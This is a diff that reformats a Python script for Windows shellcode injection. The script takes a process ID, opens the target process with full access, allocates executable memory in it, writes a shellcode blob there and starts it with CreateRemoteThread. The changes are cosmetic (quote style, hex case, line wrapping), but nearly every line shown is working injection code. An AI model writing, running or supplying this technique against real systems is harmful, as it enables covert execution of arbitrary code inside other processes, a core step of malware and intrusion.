@@ -54,11 +54,11 @@ from ctypes import windll, c_void_p, c_ulonglong, c_char_p, byref, c_ulong
 from sys import argv, exit, stderr
 
 if len(argv) != 2:
-    print('USAGES:', argv[0], '<pid>', file=stderr)
+    print("USAGES:", argv[0], "<pid>", file=stderr)
     exit(1)
 
 if not argv[1].isdigit():
-    print('USAGES:', argv[0], '<pid>', file=stderr)
+    print("USAGES:", argv[0], "<pid>", file=stderr)
     exit(1)
 
 kernel32 = windll.kernel32
@@ -95,10 +95,34 @@ shellcode = bytes(
 
 pid = int(argv[1])
 
-handle_process = kernel32.OpenProcess(0x1f0fff, False, pid)
+handle_process = kernel32.OpenProcess(0x1F0FFF, False, pid)
 kernel32.VirtualAllocEx.restype = c_void_p
-shellcode_address = kernel32.VirtualAllocEx(handle_process, 0, len(shellcode), 0x3000, 0x00000040)
-kernel32.WriteProcessMemory.argtypes = (c_void_p, c_void_p, c_char_p, c_ulonglong, c_ulonglong)
-kernel32.CreateRemoteThread.argtypes = (c_void_p, c_void_p, c_ulonglong, c_void_p, c_void_p, c_ulonglong, c_void_p)
-kernel32.WriteProcessMemory(handle_process, shellcode_address, c_char_p(shellcode), len(shellcode), c_ulonglong(0))
-kernel32.CreateRemoteThread(handle_process, None, 0, shellcode_address, None, 0, byref(c_ulong(0)))
+shellcode_address = kernel32.VirtualAllocEx(
+    handle_process, 0, len(shellcode), 0x3000, 0x00000040
+)
+kernel32.WriteProcessMemory.argtypes = (
+    c_void_p,
+    c_void_p,
+    c_char_p,
+    c_ulonglong,
+    c_ulonglong,
+)
+kernel32.CreateRemoteThread.argtypes = (
+    c_void_p,
+    c_void_p,
+    c_ulonglong,
+    c_void_p,
+    c_void_p,
+    c_ulonglong,
+    c_void_p,
+)
+kernel32.WriteProcessMemory(
+    handle_process,
+    shellcode_address,
+    c_char_p(shellcode),
+    len(shellcode),
+    c_ulonglong(0),
+)
+kernel32.CreateRemoteThread(
+    handle_process, None, 0, shellcode_address, None, 0, byref(c_ulong(0))
+)
